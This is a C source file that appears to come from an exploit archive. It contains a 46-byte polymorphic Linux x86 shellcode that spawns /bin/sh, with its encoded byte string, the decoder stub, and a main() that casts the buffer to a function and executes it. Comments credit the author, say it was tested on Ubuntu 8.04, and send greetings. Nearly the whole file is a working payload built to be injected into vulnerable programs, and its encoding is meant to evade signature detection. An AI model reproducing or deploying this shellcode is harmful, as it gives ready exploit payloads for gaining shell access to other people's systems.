#include <stdio.h>
#include <string.h>

/*
 Aodrulez's /bin/sh Null-Free Polymorphic Shellcode.
 Shellcode size : 46 bytes.
 [Special Tnx to 'Chema Garcia (aka sch3m4)']
 Tested on : Ubuntu 8.04,Hardy Heron.
 Email : f3arm3d3ar[at]gmail.com
 Author: Aodrulez. (Atul Alex Cherian)
 Blog  : Aodrulez@blogspot.com
*/


char code[] = "\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2"
	      "\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69"
	      "\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81";

int main(int argc, char **argv)
{
	fprintf(stdout,"Aodrulez's Linux Polym0rphic Shellc0de.\nShellcode Size: %d bytes.\n",strlen(code));
        (*(void(*)()) code)();
return 0;

}


/*
Greetz Fly Out to:-
1] Amforked()    : My Mentor.
2] TheBlueGenius : My Boss ;-)
3] www.orchidseven.com
4] www.isac.org.in
5] www.Malcon.org -> World's first Malware Conference!
*/